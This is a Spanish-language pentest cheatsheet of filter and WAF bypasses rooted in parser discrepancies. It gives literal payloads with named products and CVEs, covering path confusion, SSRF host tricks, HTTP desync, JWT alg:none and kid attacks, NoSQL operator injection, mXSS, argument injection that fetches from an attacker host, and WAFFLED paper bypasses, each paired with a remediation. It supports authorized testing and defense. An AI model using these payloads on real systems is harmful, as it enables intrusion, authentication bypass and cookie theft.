# ELITE-CHEATSHEET-BYPASS — Bypasses de filtro y discrepancias de parser
**Fecha:** 2026-11-02 · Material para **pruebas autorizadas**. Cada entrada lleva su
remediación defensiva, que es lo que un defensor necesita para configurar reglas.

---

## Cómo leer este documento

**Regla de admisión.** Una entrada solo está aquí si cumple los cinco criterios: payload
literal de la fuente, objetivo real identificable (producto con versión, CVE o empresa
nombrada), sin placeholders muertos, principio en 1-2 frases, y precondición clara.

**Columna `WAF/Producto`.** Siempre con versión o fecha. Un bypass sin versión es folclore:
no se puede saber si sigue vivo.

**Columna `→ writeup`.** Cada entrada verificada remite al writeup de este repo que la
documenta completa, con su control negativo A/B y sus criterios de muerte. **Este
cheatsheet es el índice; el writeup es la fuente.**

**Lo que NO está aquí.** Técnicas de repos genéricos de GitHub, listas de payloads sin
objetivo nombrado, y bypasses "de 2025" sin versión de WAF. Lo rechazado está en
`_refactor/ELITE-REJECTED.md`.

---

## 0 — EL PRINCIPIO ÚNICO

Las 47 entradas de este documento son **una sola vulnerabilidad** repetida en sustratos
distintos:

> **Dos componentes leen el mismo dato con reglas distintas.**

Validador y cliente HTTP. Proxy y aplicación. Caché y origen. Front-end y back-end. Filtro
y motor. Aplicación y mailer. Sanitizador y parser del navegador.

La regla defensiva que lo cierra todo, literal de OWASP:

> *"Treat parser disagreement as a rejection."*
> *"Reject a URL whose host is not read identically by every parser in play, rather than
> reconciling the readings."*

**Intentar reconciliar las dos lecturas crea el bypass siguiente. Rechazar la ambigüedad lo
cierra.** Toda la columna de remediación de este documento es una variante de esa frase.

Corolario ofensivo, que es la heurística más productiva del repo: **busca los puntos donde
dos componentes leen el mismo dato.** No busques payloads.

---

## 1 — DISCREPANCIA DE RUTA Y NOMBRE DE FICHERO

El control de acceso compara una cadena de ruta; el ejecutor resuelve otra.

| # | Payload literal | WAF/Producto (versión) | Precondición | → writeup |
|---|---|---|---|---|
| 1.1 | `/admin.php%3Fooo.php` | **Apache < 2.4.60** + PHP-FPM | ACL por directiva `<Files>` sobre un `.php`, y `SetHandler proxy:...fcgi` | `idor/apache-acl-bypass-files-php-fpm.md` |
| 1.2 | `/admin/deleteUser.anything` | **Spring < 5.3** | `useSuffixPatternMatch` activo — **era el valor por defecto** | `idor/url-matching-spring-suffix-y-mayusculas.md` |
| 1.3 | `/ADMIN/DELETEUSER` | Apache / genérico | El enrutador mapea sin distinguir mayúsculas; el ACL sí distingue | ídem |
| 1.4 | `/admin/deleteUser/` | genérico | El ACL trata `/x` y `/x/` como endpoints distintos | ídem |
| 1.5 | `X-Original-URL: /admin`<br>`X-Rewrite-URL: /admin` | **Drupal, Symfony (CVE-2018-14773), Zend (ZF2018-01)** — corregido 2018-08-01 | ACL en el front-end por URL, framework que honra la cabecera | `idor/header-override-x-original-url-x-rewrite-url.md` |
| 1.6 | `/img%2fcustomer94342/listener.svg` | CDN sobre **Amazon S3** (proveedor de analítica anonimizado, 2022) | CSP añadida por **prefijo de ruta** `img/`; S3 trata `/` como parte de la clave | `auth/oauth-gadget-cdn-csp-bypass-s3-svg.md` |
| 1.7 | `/share/%2F..%2Fapi/auth/session?cachebuster=123` | **Cloudflare CDN + OpenAI/ChatGPT** (2024-02-04, $6.500) | Regla de caché por prefijo `/share/*`; el CDN no decodifica el traversal, el origen sí | `cache/wildcard-web-cache-deception-chatgpt.md` |
| 1.8 | `Host: ../?x=.vcap.me` | **Yahoo** (2017, $5.000) | Backend que normaliza la ruta. `vcap.me` resuelve a **127.0.0.1**, así que equivale a `http://127.0.0.1/` sin usar una IP literal | `ssrf/host-ambiguedad-arroba-y-url-absoluta.md` |
| 1.9 | `/html/usr/lib/cgi-bin/download.cgi%3F` | **Apache < 2.4.60** | `RewriteRule` en Server Config o VirtualHost. Apache abre la ruta **con y sin** DocumentRoot | `info-disclosure/apache-documentroot-confusion-local-gadgets.md` |
| 1.10 | `//` · `/%2F` · `/index.php/xyz` · `/(A(xyz))/` | **Apache · Nginx · PHP · .NET** (2020) | Mismo endpoint, **clave de caché distinta**. Sirve como cache-buster que no altera la respuesta | `cache/cache-parameter-cloaking-varnish-akamai-rails.md` |

**Remediación transversal.** Autorizar sobre el **recurso ya resuelto** —el controlador y el
objeto concretos— no sobre la cadena de la petición. Mientras se autorice comparando texto,
cada diferencia de normalización será un bypass. Para 1.5: el borde debe **eliminar** esas
cabeceras, que son internas y nunca deben aceptarse del cliente. Para 1.6 y 1.7: normalizar
y decodificar la ruta **antes** de evaluar cualquier regla.

> **Regla general que vale más que las diez entradas:** un control de seguridad que coincide
> por **prefijo de ruta** sobre un almacén o capa que normaliza la ruta **distinto** siempre
> tiene un bypass de codificación. Vale para CSP, reglas de caché, WAF y autorización.

---

## 2 — DISCREPANCIA DE URL Y HOST

La sintaxis de URL tiene **varios sitios donde puede vivir un host**. El validador mira uno.

| # | Payload literal | Producto (versión) | Precondición | → writeup |
|---|---|---|---|---|
| 2.1 | `http://example.com\@evil.com` | **Python `urllib`** | `urlsplit().hostname` devuelve `evil.com` — parte el netloc por la **última** `@` (`netloc.rpartition('@')`) | `ssrf/parser-confusion-backslash-arroba-python-urllib.md` |
| 2.2 | `GET @burp-collaborator.net/ HTTP/1.1`<br>`Host: newrelic.com` | **New Relic** + **Apache HttpComponents** (2017, HTTPCLIENT-1803) | La librería *"failed to require that paths start with '/'"*. Lo que parece host pasa a ser **userinfo** | `ssrf/host-ambiguedad-arroba-y-url-absoluta.md` |
| 2.3 | `Host: incapsula-client.net:80@burp-collaborator.net` | **Incapsula** (2017) | El backend lo convierte en `http://incapsula-client.net:80@burp-collaborator.net/` | ídem |
| 2.4 | `GET http://internal-website.mil/ HTTP/1.1`<br>`Host: xxxxxxx.mil` | **US DoD** (2017) | *"Some servers effectively whitelist the host header, but forget that the request line can also specify a host that takes precedence."* La allowlist funciona y es irrelevante | ídem |
| 2.5 | `GET xyz.burpcollaborator.net:80/bar HTTP/1.1` | **GlobaLeaks / Tor2web** (2017) | Puerto en el objetivo de la línea de petición | ídem |
| 2.6 | `/%5C%5Cattacker-server/path/to` | **Apache sobre Windows < 2.4.60** — **CVE-2024-38472** | `AllowEncodedSlashes On`; tras 2.4.49 además `MergeSlashes Off`. `%5C%5C` = `\\` = ruta UNC | `ssrf/apache-unc-ssrf-cve-2024-38472.md` |
| 2.7 | `/brokenproxy:unix:/run/[...]|http://path/to` | **Apache < 2.4.60** — **CVE-2024-39573** | Prefijo de sustitución de `RewriteRule` totalmente controlable. La fuente llama a tales reglas *"impractical"* | ídem |

**Trampa de instrumento en 2.6.** Lo que llega al host del investigador **no es HTTP**: es un
intento de autenticación **SMB**. Con un colaborador HTTP, la sonda vulnerable y una petición
inocua se ven idénticas —nada— y se concluye que no hay SSRF. Hay que escuchar con un
servidor SMB.

**Remediación.** Cita literal de OWASP: *"Do not accept complete URLs from the user... Match
the host against an allowlist, and build the request yourself."* Y: *"Use the output value of
the method/library as the IP address to compare against the allowlist"* — comparar **lo que
se va a usar**, no lo que se recibió. Para 2.6: bloquear SMB saliente desde el servidor web,
tráfico que un servidor web no tiene razón para generar.

---

## 3 — DISCREPANCIA DE FRAMING HTTP (desync)

| # | Payload literal | Producto (fecha) | Precondición | → writeup |
|---|---|---|---|---|
| 3.1 | `Expect: 100-continue` **sin ofuscar** | **T-Mobile** (2025-08, $12.000) | *"Simply sending a valid Expect header causes a 0.CL desync on numerous different servers."* Firma: el front-end responde **≠100 sin esperar** el cuerpo | `protocolo/expect-vanilla-0cl-tmobile.md` |
| 3.2 | `Expect: y 100-continue` | **GitLab** `h1.sec.gitlab.net` (2025-08, $7.000) | Inmune a `Expect` válido, vulnerable a la forma ofuscada. RQP necesitó ~27.000 peticiones | `protocolo/expect-obfuscado-0cl-gitlab-rqp.md` |
| 3.3 | `OPTIONS /anything` + `Expect: 100-continue` ofuscado | **Akamai CDN** — **CVE-2025-32094** ($9.000). Hosts literales: `auth.lastpass.com`, `www.sky.com` | Fallo *"fully inside Akamai's infrastructure"* | `protocolo/expect-obfuscado-cl0-akamai-cve-2025-32094.md` |
| 3.4 | `OPTIONS` + `Transfer-Encoding: chunked` + chunk `50` | **Google Cloud Load Balancer** (2024-07, $8.500) | **Solo `OPTIONS`**: *"failing both with GET and POST"*. GCP LB con HTTP/1.1 por defecto | `protocolo/te0-smuggling-google-cloud.md` |
| 3.5 | `Transfer-Encoding : chunked` *(espacio antes de los dos puntos)* | genérico CL.TE | Front-end y back-end discrepan al parsear la cabecera malformada | `skills/desync-triage/SKILL.md` §0 |
| 3.6 | Sonda V-H/H-V:<br>`Host: x/x` · `Xost: x/x`<br>`Host : foo/bar` · `Xost : foo/bar` | **IIS tras AWS ALB** (2025-08) | Cuatro peticiones, cuatro estados. Dos capas respondiendo = dos parsers | `skills/desync-triage/SKILL.md` |
| 3.7 | `GET ?report=albinowax` + cuerpo `report=innocent-victim` | **GitHub** (2020-08, **$10.000**) | **Varnish sin `builtin.vcl`** + framework que acepta cuerpos en GET (Rails, Rack::Cache) | `cache/fat-get-github-report-abuse.md` |
| 3.8 | `POST /assets` + cuerpo `GET /robots.txt HTTP/1.1\r\nX: Y` vía `fetch()` | **Akamai** sobre `www.capitalone.ca` (2021-11) | Akamai ignora el CL en respuestas de redirección. **Lo emite el navegador de la víctima** | `protocolo/client-side-desync-akamai-capitalone.md` |
| 3.9 | Cabeceras + espera > timeout + cuerpo | **Varnish CVE-2022-23959** · **Apache CVE-2022-22720** ($4.000 IBB) | Front-end que responde sin leer el cuerpo (`synth()`, `Redirect 301`) y reutiliza la conexión. Varnish: **15 s** por defecto | `protocolo/pause-based-desync-varnish-apache-cve-2022-23959.md` |
| 3.10 | `POST /b/ HTTP/2` + `Content-Length: 23` + prefijo | **amazon.com** `/b/` (2022-08) | Señal limpísima: dos `200 OK` con **Content-Type incompatible** (`text/html` e `image/x-icon`) | `protocolo/cl0-desync-amazon-h2.md` |

**Nota crítica de procedencia (3.8).** El JavaScript de los ataques client-side desync lleva
comentarios `//`. Con los saltos de línea colapsados por el render de la fuente, **comentan
el resto del bloque y el código no ejecuta**. Los `\r\n` *dentro* de los literales de cadena
sí son fiables: son escapes, y son la parte que importa.

**Remediación.** HTTP/2 extremo a extremo. Con la advertencia que evita una mitigación a
medias: degradar H2→H1.1 en el front-end mitiga los ataques **client-side** pero **no** los
pause-based de servidor. Y para implementadores: *"Never assume a request won't have a
body"*, *"Default to discarding the connection if you encounter any server-level exceptions
while handling a request."*

---

## 4 — DISCREPANCIA DE CONTENIDO, CHARSET Y TIPO

| # | Payload literal | Producto | Precondición | → writeup |
|---|---|---|---|---|
| 4.1 | `Content-Type:server-status %0d%0a`<br>`Content-Type:proxy:unix:/run/php/php-fpm.sock\|fcgi://127.0.0.1/tmp/ooo.php %0d%0a` | **Apache < 2.4.60**, 9 módulos (`mod_cgi`, `mod_wsgi`, `mod_perl`, `mod_fcgid`…) | *"if `r->handler` is empty, the content of the `r->content_type` is used as the final module handler"*. Requiere CRLF en una respuesta CGI | `protocolo/apache-handler-confusion-crlf-rce.md` |
| 4.2 | `Content-Type: text/xml` sobre un endpoint de formulario | genérico | **La sonda de mayor rendimiento y la que más se olvida.** Un endpoint de formularios puede tener detrás un parser XML completo | `inyeccion/xxe-lectura-ficheros-ssrf-y-xinclude.md` |
| 4.3 | `"__proto__":{"content-type":"application/json; charset=utf-7"}` + `"role":"+AGYAbwBv-"` | **Node.js / Express** | UTF-7 de `foo` es `+AGYAbwBv-`. Un valor inerte se decodifica a `foo` **sin provocar error** | `inyeccion/server-side-prototype-pollution-deteccion-y-rce.md` |
| 4.4 | `=?x?q?=41=42=43collab=40psres.net=3e=20?=@psres.net` | **GitHub · Zendesk · GitLab Enterprise** (corregidos 2024-04/05) | Parser que decodifica **encoded-word RFC 2047 dentro de la dirección** | `auth/email-encoded-word-rfc2047-bypass-dominio.md` |
| 4.5 | `oastify.com!collab\@example.com` | **Sendmail 8.15.2** | La `\` escapa la `@`; la `!` recupera el papel de delimitador como **bang path UUCP** | `auth/email-uucp-bang-path-sendmail.md` |
| 4.6 | `collab%psres.net(@example.com` | **Postfix 3.6.4** | El paréntesis **comenta** el dominio. Es sintaxis **válida** de RFC 2822: el validador cumple el estándar y eso *es* el fallo | `auth/email-postfix-comentario-source-route.md` |
| 4.7 | `xn--0117.example.com` → `foo@@.example.com`<br>`xn--x-0314.xn--0026.xn--0193.xn--0218` → `<x.. .=` | **Joomla — CVE-2024-21725** (corregido 2024-02-20) · **IdnaConvert** (2024-02-14) | **Escapar ANTES de decodificar Punycode.** El escapado está puesto, en el sitio equivocado de la tubería | `auth/punycode-malformado-joomla-cve-2024-21725.md` |
| 4.8 | `'❀'` → `'@'` · `'✼'` → `'<'` · `'✽'` → `'='`<br>(`'❀'.codePointAt(0) % 256 === 0x40`) | PHP `chr()` y similares | Reducción del punto de código **módulo 256**. Primitiva de **encadenamiento**: por sí sola no basta, y la fuente lo declara | `auth/email-unicode-overflow-modulo-256.md` |

**Remediación.** 4.7 da la regla transferible: **todo pipeline que escape y después
decodifique tiene esta forma.** El antipatrón `escapar → decodificar` es buscable en revisión
de código, y vale para Punycode, entidades HTML, URL-encoding y encoded-word. Para 4.4,
cita literal: *"I recommend you disable 'encoded-word' when using an email parsing library"*,
con el regex de último recurso `=[?].+[?]=`. Y la conclusión de fondo: *"it's never safe to
use email domains for access control enforcement"*.

---

## 5 — BYPASS DE FILTRO POR SUSTITUCIÓN DE UNA PASADA

El filtro no está mal escrito: opera sobre la representación equivocada.

| # | Payload literal | Filtro objetivo | Mecanismo | → writeup |
|---|---|---|---|---|
| 5.1 | `?__pro__proto__to__.gadget=payload` | Filtro que **elimina** `__proto__` una vez | Al borrar el interior queda `?__proto__.gadget=payload` | `inyeccion/prototype-pollution-deteccion-fuentes-cliente.md` |
| 5.2 | `- var x = root.process`<br>`- x = x.mainModule` | **CodePen** (corregido) — filtro de palabras `->process`, `->mainModule` | Trocear el acceso en dos sentencias: la cadena prohibida nunca aparece junta | `inyeccion/ssti-jade-node-child-process-codepen.md` |
| 5.3 | `query{__schema {queryType{name}}}`<br>GET: `?query=query%7B__schema%0A%7B...` | Filtro textual sobre `__schema{` | GraphQL tolera espacios donde el filtro no los espera. La variante GET añade que el filtro solo inspecciona cuerpos | `inyeccion/graphql-introspeccion-y-bypass-whitespace.md` |
| 5.4 | `<audio src/onerror=alert(1)>` | Filtro del **espacio** entre atributos | La `/` separa atributos sin espacio. Además `src` vacío garantiza el error de carga: ejecuta siempre, sin alojar nada | `xss/media-events-audio-video-onerror.md` |
| 5.5 | `oncontentvisibilityautostatechange=alert(1)` | **Lista negra enumerada** de nombres de evento | Si bloquea `onerror` y deja pasar este, la lista es enumerada y hay más huecos. Es el test que lo revela | `xss/content-visibility-autostatechange.md` |
| 5.6 | `<xss style="animation-name:x" onanimationstart=...>` + `<style>@keyframes x{}</style>` | Allowlist de **nombres de etiqueta** | `<xss>` no está en ninguna lista negra porque no existe en HTML. El `@keyframes` puede estar **vacío** | `xss/animation-events-ejecucion-sin-interaccion.md` |
| 5.7 | `__Host__` **≠** `__Host-` | — | **Errata en una remediación publicada** (Snyk). Aplicar la forma con dos guiones bajos produce una corrección **inoperante con apariencia de aplicada** | `auth/cookie-tossing-oauth-gitpod-cve-2024-21583.md` |

---

## 6 — DISCREPANCIA DE DELIMITADOR (cache parameter cloaking)

| # | Payload literal | Producto | Mecanismo | → writeup |
|---|---|---|---|---|
| 6.1 | `/search?q=help?_=payload&!&search=1` | **Varnish** con regex `"\?_=[^&]+&"` | El regex borra `?_=...&` al construir la clave; la aplicación **sí** recibe el payload | `cache/cache-parameter-cloaking-varnish-akamai-rails.md` |
| 6.2 | `/en?x=1?akamai-transform=payload` | **Akamai** (corregido tras el reporte) | Dos separadores, **misma clave**: el `?` no se reconoce para excluir el parámetro | ídem |
| 6.3 | `/jsonp?callback=legit&utm_content=x;callback=alert(1)//` | **Ruby on Rails** | Rails trata el **`;`** como delimitador de parámetros; la caché no | ídem |
| 6.4 | `Origin: '-alert(1)-'__` + `/?x=2__Origin='-alert(1)-'` | **Akamai** (*"working on a fix"*) | **La clave de caché es un formato serializado** construido por concatenación. Todo formato así es inyectable | `cache/cache-key-injection-akamai-origin.md` |
| 6.5 | `/%3fproduct=firefox-73.0.1-complete&...` | **nginx** + `download.mozilla.org` | Normalización de clave: `%3f` cambia la clave sin cambiar el recurso | ídem |
| 6.6 | `Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key` | **Akamai** | **No es un bypass: es el oráculo.** Devuelve `X-True-Cache-Key` y convierte la adivinanza en lectura | ídem |

**6.6 merece atención aparte.** Con la clave visible, el trabajo deja de ser adivinanza: se
compara **qué entra en la clave** con **qué llega a la aplicación**, y la diferencia *es* la
vulnerabilidad. Principio de recon: **busca el oráculo antes de atacar el mecanismo.**

---

## 7 — INYECCIÓN DE ARGUMENTOS (sin un solo metacarácter)

Todo filtro que busque `;`, `|`, `&`, `$` deja pasar estos intactos.

| # | Payload literal | Producto | Mecanismo | → writeup |
|---|---|---|---|---|
| 7.1 | `?url=--directory-prefix=. http://attacker.com/malicious.php` | PHP `escapeshellcmd()` | *"can pass unlimited parameters, but cannot execute other commands."* El segundo `--directory-prefix` sobrescribe el primero | `inyeccion/argument-injection-escapeshellcmd-wget-directory-prefix.md` |
| 7.2 | `-- http://host-controlado/c` | **curl** | *"In curl, later arguments are still URL operands: `--` does not prevent additional transfers."* **Documenta el fallo de una mitigación** | `inyeccion/argument-injection-curl-doble-guion-globoff.md` |
| 7.3 | Un **espacio** que añada un argumento | Java `Runtime.exec(String)` (deprecado en Java 18) | *"does NOT try to invoke the shell... does not support shell metacharacters."* Parte en tokens **solo por espacios** | `inyeccion/cmd-injection-java-runtime-exec-tokenizacion.md` |

**La firma de 7.3:** metacaracteres que **fallan** y un espacio que **funciona**. Si los
metacaracteres sí funcionan, hay una shell en medio y es otra clase. Probar solo
metacaracteres y archivar el objetivo es el error más común aquí.

---

## 8 — BYPASS DE VERIFICACIÓN CRIPTOGRÁFICA

| # | Payload literal | Mecanismo | → writeup |
|---|---|---|---|
| 8.1 | `{"alg":"none","typ":"JWT"}` + **punto final obligatorio**: `<header>.<payload>.` | *"the payload part must still be terminated with a trailing dot."* Sin el punto el token está mal formado y el rechazo se lee como "no vulnerable" | `auth/jwt-alg-none-token-sin-firma.md` |
| 8.2 | `{"kid":"../../../dev/null","alg":"HS256"}` + secreto = **cadena vacía** | No hay que **adivinar** el contenido de un fichero: basta elegir uno cuyo contenido se conozca | `auth/jwt-kid-path-traversal-devnull.md` |
| 8.3 | `alg` a `HS256` + firmar con la **clave pública RSA** como secreto HMAC | La clave pública se publica **por diseño**. El material del ataque no es un secreto filtrado | `auth/jwt-algorithm-confusion-rs256-hs256.md` |
| 8.4 | `response_type=code,id_token` · `response_mode=web_message` | Empuja todo al **fragmento**, que no se envía al servidor: el sitio no lo consume y el token queda vivo en `location.href` | `auth/oauth-response-type-switching-google-apple.md` |
| 8.5 | `/CaLlBaCk` · `/callbackxxx` · `/callback%3fcode=xxx%26` | **5 de 125** flujos de Google aceptaban también su página de inicio como `redirect_uri` (4%) | `auth/oauth-redirect-uri-case-shifting-y-appending.md` |

**Causa raíz de 8.1-8.3, una sola frase:** en JWT, **el dato que decide cómo validar viaja
dentro del dato a validar**. `alg`, `jwk`, `jku`, `kid` y `x5c` son instancias del mismo
error. La regla: la clave de verificación se resuelve desde **configuración del servidor**,
nunca desde contenido del token.

**Control de 8.5 que cuesta una petición y no toca OAuth:** enviar `?code=A&code=B` a la ruta
de callback y ver cuál gana. Si gana el primero, la variante es explotable.

---

## 9 — INYECCIÓN DE OPERADOR Y DE TIPO

| # | Payload literal | Producto | Mecanismo | → writeup |
|---|---|---|---|---|
| 9.1 | `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}` | **MongoDB** | **Ningún metacarácter.** El ataque vive en el **tipo** del valor, no en su contenido. Un WAF de SQLi no ve nada porque no hay nada que ver | `inyeccion/nosql-operator-injection-bypass-autenticacion.md` |
| 9.2 | `username[$ne]=invalid` | MongoDB vía form-urlencoded | Misma inyección donde no se acepta JSON | ídem |
| 9.3 | `amount=-1000` | genérico | `importe <= saldo` es **siempre cierta** con un negativo. La validación funciona; la regla de negocio no estaba escrita | `logica-negocio/cantidad-negativa-transferencia-fondos.md` |
| 9.4 | `/FontMatrix [1 2 3 4 5 (0\); alert\('foobar')]` | **PDF.js < 4.2.67** — **CVE-2024-4367** | Una **optimización de rendimiento** que compila datos a JS con `new Function`. Mitigación: `isEvalSupported = false` | `xss/pdfjs-fontmatrix-cve-2024-4367.md` |
| 9.5 | `'foo' 'bar'` *(con espacio)* · `-- comment` *(con espacio tras el guion)* | **MySQL** | Dos caracteres invisibles al leer un payload. Cuando faltan, el fallo parece "no vulnerable" | `inyeccion/sqli-concatenacion-substring-comentarios-por-dbms.md` |
| 9.6 | `'foo'+'bar'` en **MySQL** → devuelve `0`, **no error** | MySQL | **Falso negativo silencioso**: si se espera un error como señal de "motor incorrecto", MySQL pasa desapercibido | ídem |

---

## 10 — MUTACIÓN POST-SANITIZACIÓN (mXSS)

| # | Payload literal | Producto | Mecanismo | → writeup |
|---|---|---|---|---|
| 10.1 | `<form><h1></form><table>...</table></h1></form>` × **510** + `<math><mi><style><!--</style>...` | **DOMPurify ≤ 3.1.2** (corregido en 3.1.3) | **Sanear dos veces es lo que lo rompe.** El aplanado ocurre **después** del parseo, así que la mutación se dispara en el tercer parseo | `xss/dompurify-mxss-triple-parsing.md` |
| 10.2 | `<form id="x "></form><input form="x" name="__depth">` | DOMPurify ≤ 3.1.2 | `_sanitizeAttributes` **recorta** los valores **después** de la comprobación de clobbering. Un espacio al final de un `id` | ídem |

**Por qué `n = 510`.** Está calibrado contra el límite de anidamiento del navegador:
DOMParser (Chromium, Firefox, Safari) aplana a **512**, mientras libxml2/php-xml/lxml
**eliminan** a 255 y nokogiri a 256. Que el navegador **aplane** en lugar de eliminar es la
precondición de toda la familia.

**Contradicción registrada:** el bloque de código de la Fig. 55 del artículo y su propio
enlace de PoC en vivo **no coinciden**. El writeup conserva ambas versiones sin elegir.

---

## 11 — WAFFLED: discrepancias de parseo de contenido contra WAFs comerciales

**Paper:** *WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls*.
Akhavani, Jabiyev, Kallus, Topcuoglu, Bratus, Kirda. arXiv:2503.10846v4 (2026-03-13), CC BY 4.0.
**Repositorio:** `github.com/sa-akhavani/waffled` — HEAD `747f79d`, MIT,
*"Copyright (c) 2025 NEU SecLab and its affiliates."* El README del repo cita
**ACSAC 2025, DOI 10.1109/ACSAC67867.2025.00062, pp. 689-702**; la cadena "ACSAC" **no
aparece** en el texto del preprint de arXiv. Son el mismo trabajo por dos vías.

> **Descargo de los autores, literal del repositorio:** *"The listed bypasses are only and
> only for testing purposes and education purposes. We highly discourage the use of these
> bypasses in any production environment."*

### 11.0 — Cuatro correcciones a lo que se suele afirmar de este paper

**(1) Los bypasses SÍ están publicados.** Yo mismo afirmé lo contrario en el commit
`f9262cc` y estaba equivocado. El repositorio contiene **32 peticiones de bypass
literales**: 10 en `bypass-database/json_requests.raw`, 15 en `multipart_requests.raw`, 7
en `xml_requests.raw`. No son los 1207 — el README precisa: *"For each bypass category, we
provide one sample of the bypassed request."*

**(2) La configuración de los WAFs NO está publicada**, aunque el README la anuncia. Cero
`docker-compose`, cero Terraform, cero reglas, cero `modsecurity.conf`, cero CRS. Buscado
por nombre de fichero y por contenido.

**(3) No hay gramática `urlencoded`**, aunque el README lista
`application/x-www-form-urlencoded` entre los content-types cubiertos y afirma *"Multiple
grammars are provided for each content-type"*. Existen 5 gramáticas: 2 JSON, 2 multipart,
1 XML.

**(4) AWS no fue bypasseado, y el paper se contradice con su propio abstract.**

| Dónde | Qué dice |
|---|---|
| Abstract | *"1207 bypasses across 5 well-known WAFs, AWS, Azure, Cloud Armor, Cloudflare, and ModSecurity"* |
| TABLE I, columna *Bypassed* | **`No` para Amazon AWS WAF**; `Yes` para los otros cuatro |
| §VII, párrafo *"Performance Cost"* | *"the lack of successful bypasses against AWS WAF"* |
| §IX (divulgación) | **omite AWS** |

Son **cuatro** WAFs bypasseados, no cinco. (Y no existe una "sección 7.4": la sección VII
no tiene subsecciones numeradas.)

### 11.1 — Numeración de tablas y qué contienen de verdad

Las 24 clases **no** están en las Tablas 3/4/5, como suele citarse:

| Tabla | Contenido |
|---|---|
| **TABLE III** | Lista de parsers probados y sus descargas semanales *"as of July 2024"* |
| **TABLE IV** | **12 clases multipart**, dos columnas: `Category Name` y `Request Example` |
| **TABLE V** | **7 clases XML** |
| **TABLE VI** | **5 clases JSON**, columna `Bypassed Request Example` |

**No existe columna de WAF ni de framework en ninguna de las tres.** El mapeo clase →
(WAF, framework) vive **solo en las Figuras 3, 4 y 5**, que son gráficos 3D de barras en
SVG: las alturas son geometría, no texto, y **no son reconstruibles**. El único mapeo
textual del paper es *Field Name Hack → Cloud Armor + Spring Boot*.

### 11.2 — NOTA DE PROCEDENCIA que decide si los payloads funcionan

El HTML del paper **no contiene ni un byte de control**. Por tanto los `\x00`, `\t` y
`\r\n` de las tablas son **texto literal de 2-4 caracteres ASCII** (`\`+`x`+`0`+`0`), no
bytes reales. Para reproducir hay que **emitir el byte real**.

Los ficheros `.raw` del repositorio tienen la misma propiedad y es una ventaja: cada
petición es un literal de bytes de Python en **una sola línea física**, con los CRLF
escapados como texto. Verificado con `cat -A`: cero bytes CR reales. **No hay riesgo de
colapso de saltos de línea.** Quien materializa los CRLF es `http-request-relay/http_relay.py`.

> **Advertencia de seguridad propia (análisis, no del repo):** ese relay hace
> `[eval(req.strip()) for req in requests]` — `eval()` sobre cada línea del fichero.
> Ejecuta código arbitrario si el fichero se manipula. Usa `ast.literal_eval`.

### 11.3 — Identificación del objetivo (criterio 2)

El dataset está **anonimizado**: cero nombres de fabricante (grep en todo el repo). Lo que
sí identifica la infraestructura:

- **Literal en 3 peticiones:** `x-crs-version: 3.3.6` con `x-crs-paranoia-level: 1` y `2`.
- **Por inferencia de `Server:`** en `output-parser/data/sample-treqs-output`:
  `awselb/2.0` (AWS ALB), `Microsoft-Azure-Application-Gateway/v2` (Azure WAF),
  `nginx/1.18.0 (Ubuntu)` (ModSecurity sobre NGINX), `Werkzeug/3.0.1 Python/3.10.12`
  (el echo server Flask, no un WAF).
- **Configuración exacta, de la TABLE I del paper, *"As of July 2024"*:** AWS WAF (ELB) +
  AWS Managed Ruleset + OWASP CRS 3.0 · Cloudflare WAF **Pro** + Managed Ruleset + CRS ·
  Azure WAF **V2** (Application Gateway) + CRS 3.0 · Google Cloud Armor con
  `sqli-v33-stable` y `xss-v33-stable`, **Sensitivity Level 1** · ModSecurity sobre NGINX +
  CRS 3.0 **Paranoia Level 1**.

**Fecha:** julio 2024. Cloudflare *"stated that they are working on a fix"* y Azure estaba
retirando CRS 3.0 hacia DRS 2.1. **La aplicabilidad actual a cualquier WAF concreto no está
establecida.**

### 11.4 — EL CONTROL NEGATIVO VIENE EN EL DATASET

Esto es lo mejor del repositorio y lo que lo distingue de una lista de payloads:
`bypass-database/detectables/` contiene las **cuatro peticiones base que SÍ se detectan**.

El README lo convierte en instrucción: *"It only modifies the request structure. If you are
testing a WAF, make sure that these attack payloads are detected by the WAF when sent in a
normal request."*

**Los propios autores exigen ejecutar el control negativo primero.** Base detectable para
JSON, literal:

```
POST /json HTTP/1.1\r\nHost: waf.mytargetwebapp.com\r\nConnection:close\r\nUser-Agent: Mozilla/5.0\r\nX-Request-ID: 71\r\nContent-Type: application/json\r\nContent-Length: 52\r\n\r\n{"field1":"<script>alert(document.cookie)</script>"}
```

Si **esa** no se bloquea, el WAF no está inspeccionando y ningún bypass de abajo prueba
nada. **Cada payload de esta sección es esa misma petición con una única mutación
estructural.** El payload de ataque nunca cambia: las mutaciones se aplican *"everywhere
except the attack payload itself"*. El paper aporta **envoltorios**, no payloads de ataque.

### 11.5 — Los 32 bypasses, por mecanismo

Todos sobre el mismo payload de ataque (`<script>alert(document.cookie)</script>` o
`' and 1=1 --`). Omito las cabeceras comunes; **la mutación está marcada**.

#### A — Corrupción del NOMBRE de la cabecera `Content-Type` (4)
El WAF no reconoce el tipo, así que **no inspecciona el cuerpo**. La aplicación lo parsea
igual porque su framework es más tolerante.

| Mutación literal | Content-type | Nota |
|---|---|---|
| `ContentType: application/json` | JSON | **sin el guion** |
| *(cabecera `Content-Type` ausente por completo)* | JSON | verificado con `x-crs-version: 3.3.6`, `paranoia-level: 1` |
| `Content_-Type: multipart/form-data; boundary=real` | multipart | **guion bajo insertado** |
| `Cntent-Type: multipart/form-data; boundary=real` | multipart | **falta la `o`**; con `x-crs-version: 3.3.6`, `paranoia-level: 1` |

#### B — `Content-Type` desplazado o sin nombre de cabecera (3, todos XML)
| Mutación literal | Nota |
|---|---|
| `Content-Length: 315\r\n\r\nContent-Type: application/xml\r\n\r\n<?xml ...` | **el `Content-Type` va DENTRO del cuerpo**, tras la línea en blanco |
| `Content-Length: 307\r\napplication/xml\r\n\r\n<?xml ...` | valor **sin nombre de cabecera** |
| `Content-Length: 307\r\napplication/xmlapplication/xml\r\n\r\n<?xml ...` | valor **duplicado** sin nombre |

#### C — Alteración del VALOR del `Content-Type` (3, multipart)
| Mutación literal | Nota |
|---|---|
| `Content-Type: \tmultipart/form-data; boundary*0=re;boundary*1=al` | **TAB tras los dos puntos** + continuación **RFC 2231**: `boundary*0`+`boundary*1` se concatenan a `real` |
| `Content-Type: multipart/form-data; boundary*0=re;boundary*1=al` | solo la continuación RFC 2231 |
